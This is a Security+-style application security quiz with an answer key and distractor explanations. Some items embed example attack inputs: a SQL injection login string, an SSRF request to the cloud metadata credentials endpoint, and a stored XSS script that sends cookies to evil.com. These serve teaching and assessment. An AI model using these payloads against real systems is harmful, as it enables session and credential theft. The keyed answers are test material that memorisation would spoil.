# Quiz: Module 10 — Application Security

## Course: CIS-4328 Information Security

**Certification Alignment:** CompTIA Security+ (SY0-701)

---

## Instructions

Select the single best answer for each question. Each question is worth 10 points. This quiz is open-note but must reflect your own work. Questions are written to match the difficulty and style of the CompTIA Security+ SY0-701 exam.

---

## Question 1

A developer builds a login form that constructs the following query at runtime: `SELECT * FROM users WHERE user='` + username + `' AND pass='` + password + `'`. An attacker enters `admin'--` as the username and any value as the password. What type of vulnerability is being exploited?

A) Cross-site scripting

B) SQL injection

C) LDAP injection

D) Session fixation

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Cross-site scripting injects client-side script into pages viewed by other users. It does not manipulate database queries or comment out SQL clauses.
- Why C is incorrect: LDAP injection targets LDAP directory service queries. The scenario describes a SQL string being manipulated with SQL comment syntax, which is specific to SQL injection.
- Why D is incorrect: Session fixation involves tricking a victim into using a known session token. It does not involve database query manipulation.

---

## Question 2

A security analyst is reviewing the OWASP Top 10 2021 list and notes that category A01 is Broken Access Control. A junior developer asks what specific flaw allows a user to view another customer's order by changing the numeric order ID in the URL. Which term best describes this flaw?

A) Privilege escalation

B) Session hijacking

C) Insecure Direct Object Reference

D) Server-Side Request Forgery

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Privilege escalation means gaining a higher level of access (e.g., user to admin). IDOR is a horizontal access issue — accessing a peer user's data at the same privilege level without going higher.
- Why B is incorrect: Session hijacking involves stealing an authenticated session token to impersonate a user. IDOR does not require stealing a session — the attacker uses their own authenticated session but accesses another user's object.
- Why D is incorrect: SSRF causes the server to make outbound HTTP requests to attacker-controlled destinations. It does not involve manipulating object identifiers in application URLs.

---

## Question 3

A security team is selecting automated testing tools for their CI/CD pipeline. They want a tool that analyzes source code for vulnerabilities before the application is compiled or run. Which tool type should they select?

A) DAST

B) SAST

C) IAST

D) WAF

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: DAST (Dynamic Application Security Testing) tests the running application by sending crafted inputs. It requires the application to be deployed and executing — source code analysis is not DAST.
- Why C is incorrect: IAST instruments the running application at runtime to observe behavior from within. It does not analyze source code statically before compilation.
- Why D is incorrect: A WAF (Web Application Firewall) is a runtime security control that filters HTTP traffic. It is not a testing tool and does not analyze source code.

---

## Question 4

An organization deploys a web application that fetches a URL provided by the user in a form field. An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the URL. The application retrieves and displays the response. Which OWASP Top 10 category does this attack represent?

A) A05 — Security Misconfiguration

B) A03 — Injection

C) A10 — Server-Side Request Forgery

D) A02 — Cryptographic Failures

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Security misconfiguration involves improper system configuration, such as default credentials or open storage buckets. The attack here exploits the application's outbound fetch behavior, not a misconfiguration of a service.
- Why B is incorrect: Injection involves embedding malicious commands in interpreter inputs. SSRF forces the server to make outbound requests — the exploit is about the destination of the request, not injection into a query language.
- Why D is incorrect: Cryptographic failures involve inadequate protection of data in transit or at rest. This attack uses no cryptographic mechanism — it exploits the server's HTTP fetch capability.

---

## Question 5

A software vendor signs all released binaries with a code-signing certificate issued by a trusted CA. After a security incident, investigators discover that the released binary contains malware. The binary's digital signature is still valid. Which scenario best explains how this is possible?

A) The CA revoked the certificate before the signing occurred.

B) The attacker forged the digital signature by cracking the vendor's public key.

C) The vendor's build environment was compromised, and malware was injected before signing.

D) The hash algorithm used was MD5, which allowed collision.

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: If the certificate were revoked before signing, the signature would be invalid, not valid. A valid signature confirms the certificate was active at signing time.
- Why B is incorrect: Modern RSA and ECDSA private keys are computationally infeasible to crack. Forging a signature by factoring the private key is not a realistic attack vector.
- Why D is incorrect: While MD5 collision attacks exist, producing a signed binary with a meaningful malicious payload via a hash collision is practically infeasible. The SolarWinds attack, which this scenario describes, involved build environment compromise, not hash collision.

---

## Question 6

A developer stores user passwords by converting them to lowercase and applying MD5 before storing in the database. Which two weaknesses does this approach introduce? (Choose two — select the answer that lists both correct weaknesses.)

A) Passwords are not salted, enabling rainbow table attacks; MD5 is a fast hash not designed for password storage

B) MD5 is reversible encryption, not a hash; passwords should be stored as SHA-256

C) Passwords are truncated to lowercase, violating NIST length guidelines; SHA-1 is stronger than MD5

D) MD5 is too slow for large databases; bcrypt should replace it for performance reasons

**Correct Answer:** A

**Distractor Analysis:**

- Why B is incorrect: MD5 is a cryptographic hash function, not reversible encryption. Saying MD5 is reversible is technically incorrect. SHA-256 is also a fast hash not suitable for passwords.
- Why C is incorrect: NIST SP 800-63B does not prohibit case conversion — it recommends allowing all printable characters. SHA-1 is not stronger than MD5 for password storage; both are unsuitable because both are fast hashes.
- Why D is incorrect: MD5 is fast, which is the weakness — not slowness. bcrypt is preferred because it is deliberately slow, but the reason is security not performance.

---

## Question 7

An organization performs a security review of its software development process. The team discovers that security requirements are not collected until after the application is deployed to production and a pen test reveals vulnerabilities. Which concept does this violate?

A) Defense in depth

B) Shift-left security

C) Zero trust

D) Separation of duties

**Correct Answer:** B

**Distractor Analysis:**

- Why A is incorrect: Defense in depth is an architectural principle of layered controls. Collecting security requirements late is a lifecycle process failure, not a missing layer of controls.
- Why C is incorrect: Zero trust is a network and access architecture principle requiring continuous verification. It does not govern when in the SDLC security activities occur.
- Why D is incorrect: Separation of duties requires that no single person controls an entire sensitive workflow. Timing of security requirements collection is an SDLC process issue, not a privilege separation issue.

---

## Question 8

A web application accepts blog post comments and stores them in a database. Any user who views the post sees the stored comments rendered in the browser. An attacker enters `<script>document.location='http://evil.com/?c='+document.cookie</script>` as a comment. Which XSS type is this, and why?

A) Reflected XSS, because the script is reflected back in the response to the attacker

B) DOM-based XSS, because the script manipulates the Document Object Model directly

C) Stored XSS, because the script is saved in the database and served to all future visitors

D) CSRF, because the script redirects users to another domain

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: Reflected XSS requires the victim to click a crafted link that includes the payload in the request. In this scenario, the payload is stored in the database and served automatically to all users who view the post — no crafted link is needed.
- Why B is incorrect: DOM-based XSS occurs entirely client-side through JavaScript manipulation of the DOM without server involvement. This attack stores the payload server-side in the database.
- Why D is incorrect: CSRF (Cross-Site Request Forgery) tricks authenticated users into submitting unintended requests using their existing session. This attack exfiltrates cookies via a stored script — it is XSS, not CSRF.

---

## Question 9

A threat model is being created for a new application that processes financial transactions. The team identifies a risk that an employee in the Finance department with read-only access could modify transaction records. Which STRIDE threat category does this represent?

A) Spoofing

B) Tampering

C) Repudiation

D) Elevation of Privilege

**Correct Answer:** D

**Distractor Analysis:**

- Why A is incorrect: Spoofing involves impersonating another user or system identity. In this scenario, the employee is acting as themselves — the risk is that they can perform actions beyond their read-only permission level.
- Why B is incorrect: Tampering involves unauthorized modification of data. While modifying transaction records is tampering, the STRIDE category that best captures the root cause — a user performing actions beyond their assigned permissions — is Elevation of Privilege.
- Why C is incorrect: Repudiation involves denying having performed an action, which requires logging and non-repudiation controls. The scenario describes a privilege scope issue, not a logging or denial issue.

---

## Question 10

A DevSecOps team adds a stage to their CI/CD pipeline that sends crafted HTTP requests to the deployed staging application and analyzes the responses for vulnerability indicators. No source code access is used. Which tool type did the team integrate?

A) SAST

B) IAST

C) DAST

D) SCA (Software Composition Analysis)

**Correct Answer:** C

**Distractor Analysis:**

- Why A is incorrect: SAST (Static Application Security Testing) requires access to source code or compiled binaries and does not execute the application. The scenario explicitly states the tool sends HTTP requests to a deployed application without source code access.
- Why B is incorrect: IAST instruments the running application from within by inserting an agent. The scenario describes external HTTP request crafting, which is the DAST approach, not internal instrumentation.
- Why D is incorrect: SCA (Software Composition Analysis) scans dependency manifests and packages to identify components with known CVEs. It does not send HTTP requests to a running application to test for vulnerabilities.

---

*End of Quiz — Module 10*
